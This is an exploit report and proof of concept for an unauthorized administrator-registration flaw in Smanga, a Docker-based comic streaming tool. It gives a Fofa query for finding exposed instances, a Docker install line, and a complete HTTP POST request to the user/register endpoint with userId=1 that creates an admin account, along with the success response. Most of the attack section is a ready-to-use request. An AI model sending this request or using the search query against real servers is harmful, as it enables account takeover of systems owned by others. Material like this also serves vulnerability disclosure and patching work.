### Vulnerability Report for Smanga MediaId - Unauthorized Operations

#### 1. Unauthorized Addition of Administrator User

**Exploit Title:** Smanga MediaId Unauthorized Addition of Administrator User  
**Date:** 2024-04-01  
**Exploit Author:** Shuo Sheng, Jixin Zhang  

##### Description:

Smanga is a Docker-based comic streaming tool inspired by Emby and Plex, designed to meet the needs of comic reading. The `mediaId` in Smanga allows unauthorized addition of administrator users.

##### Fofa Query:

```
title="smanga"
```

##### Installation via Docker:

```dockerfile
docker run -itd --name smanga \
-p 3333:3306 \
-p 9797:80 \
-v /mnt:/mnt \
-v /route/smanga:/data \
lkw199711/smanga;
```

##### Proof of Concept (PoC):

To successfully exploit this vulnerability, you must include `userId=1`.

**Request Packet:**

```http
POST /php/public/index.php/user/register HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 38
Origin: url
Connection: keep-alive
Referer: url
Priority: u=0

userId=1&userName=ssss&passWord=sanbao
```

**Response:**

```json
{
  "status": "success",
  "message": "user add success"
}
```

#### 